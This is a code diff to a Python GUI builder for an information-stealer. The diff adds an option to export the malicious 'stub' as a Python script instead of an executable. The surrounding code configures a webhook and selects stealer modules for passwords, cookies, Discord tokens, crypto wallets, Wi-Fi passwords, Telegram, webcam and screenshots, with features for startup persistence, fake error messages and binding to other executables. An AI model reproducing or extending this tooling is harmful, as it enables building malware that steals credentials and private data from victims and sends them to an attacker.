@@ -5,8 +5,10 @@ import sys
 import json
 import ctypes
 import shutil
+import ast
 
 import customtkinter as ctk
+from tkinter import messagebox, filedialog
 from pkg_resources import parse_version
 from socket import create_connection
 from tkinter import messagebox
@@ -80,6 +82,8 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.boundExePath = ""
 		self.iconBytes = ""
 
+		self.OutputAsExe = True
+
 		for i in range(6):
 			self.rowconfigure(i, weight= 1)
 		
@@ -152,6 +156,9 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		selectIconButton = ctk.CTkButton(self, text= "Select Icon", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= lambda: self.selectIconButton_Callback(selectIconButton))
 		selectIconButton.grid(row= 2, column= 5, sticky= "ew", padx= (0, 15))
 
+		buildModeButton = ctk.CTkButton(self, text= "Output: Executable", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= lambda: self.buildModeButton_Callback(buildModeButton))
+		buildModeButton.grid(row= 3, column= 5, sticky= "ew", padx= (0, 15))
+
 		buildButton = ctk.CTkButton(self, text= "Build", height= 38, font= self.font, fg_color= "#1E5128", hover_color= "#4E9F3D", command= self.buildButton_Callback)
 		buildButton.grid(row= 5, column= 5, sticky= "ew", padx= (0, 15))
 	
@@ -197,6 +204,14 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 			self.iconBytes = b""
 			button.configure(text= DISABLED)
 	
+	def buildModeButton_Callback(self, button: ctk.CTkButton) -> None:
+		EXEMODE = "Output: Executable"
+		PYMODE = "Output: Python Script"
+
+		self.OutputAsExe = not self.OutputAsExe
+
+		button.configure(text= EXEMODE if self.OutputAsExe else PYMODE)
+	
 	def buildButton_Callback(self) -> None:
 		webhook = self.webhookVar.get().strip()
 
@@ -213,7 +228,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 			messagebox.showwarning("Warning", "Unable to connect to the internet!")
 			return
 		
-		elif not (self.captureWebcamVar.get() or self.capturePasswordsVar.get() or self.captureCookiesVar.get() or self.captureHistoryVar.get() or self.captureDiscordTokensVar.get() or self.captureMinecraftVar.get() or self.captureRobloxCookiesVar.get() or self.captureWifiPasswordsVar.get() or self.captureSystemInfoVar.get() or self.captureScreenshotVar.get()):
+		elif not (self.captureWebcamVar.get() or self.capturePasswordsVar.get() or self.captureCookiesVar.get() or self.captureHistoryVar.get() or self.captureDiscordTokensVar.get() or self.captureGamesVar.get() or self.captureWalletsVar.get() or self.captureWifiPasswordsVar.get() or self.captureSystemInfoVar.get() or self.captureScreenshotVar.get() or self.captureTelegramVar.get()):
 			messagebox.showwarning("Warning", "You must select at least one of the stealer modules!")
 			return
 		
@@ -247,7 +262,10 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 		configData = json.dumps(config, indent= 4)
 
-		self.master.Build(configData, self.iconBytes, self.boundExePath)
+		if self.OutputAsExe:
+			self.master.BuildExecutable(configData, self.iconBytes, self.boundExePath)
+		else:
+			self.master.BuildPythonFile(configData, self.iconBytes, self.boundExePath)
 			
 	def testWebhookButton_Callback(self) -> None:
 		webhook = self.webhookVar.get().strip()
@@ -397,10 +415,62 @@ class Builder(ctk.CTk):
 		self.builderOptions = BuilderOptionsFrame(self)
 		self.builderOptions.grid(row= 1, column= 0, sticky= "nsew")
 	
-	def Build(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
+	def BuildPythonFile(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
+		options: dict = json.loads(config)
+		excludeList = []
+
+		if options["modules"]["fakeError"][0]:
+			excludeList.append("Fake Error")
+		
+		if options["modules"]["captureWebcam"]:
+			excludeList.append("Capture Webcam")
+		
+		if options["settings"]["startup"]:
+			excludeList.append("Put On Startup")
+		
+		if iconFileBytes:
+			excludeList.append("Icon")
+		
+		if boundFilePath:
+			excludeList.append("Bind Executable")
+		
+		if excludeList:
+			message = "You are exporting the stub as a Python script. The following features will not work if you continue:\n\n" + "\n".join(["%d) %s" % (n+1, x) for n, x in enumerate(excludeList)]) + "\n\nDo you still want to continue?"
+			if not messagebox.askyesno("Confirmation", message):
+				return
+		
+		outPath = filedialog.asksaveasfilename(confirmoverwrite= True, defaultextension= ".py", filetypes= [("Python Script", ["*.py","*.pyw"])], initialfile= "stub.py", title= "Save as")
+		if outPath is None:
+			return
+		
+		with open(os.path.join(os.path.dirname(__file__), "Components", "stub.py")) as file:
+			code = file.read()
+		
+		sys.path.append(os.path.join(os.path.dirname(__file__), "Components")) # Adds Components to PATH
+
+		from Components import process
+		_, injection = process.ReadSettings()
+		code = process.WriteSettings(code, options, injection)
+
+		if os.path.isfile(outPath):
+			os.remove(outPath)
+
+		try: 
+			code = ast.unparse(ast.parse(code)) # Removes comments
+		except Exception: 
+			pass
+
+		code = "# pip install pyaesm dpapi==0.1 pillow urllib3\n\n" + code
+
+		with open(outPath, "w") as file:
+			file.write(code)
+
+		messagebox.showinfo("Success", "File saved as %r" % outPath)
+	
+	def BuildExecutable(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
 		def Exit(code: int = 0) -> None:
 			os.system("pause > NUL")
-			exit()
+			exit(code)
 		
 		def clear() -> None:
 			os.system("cls")
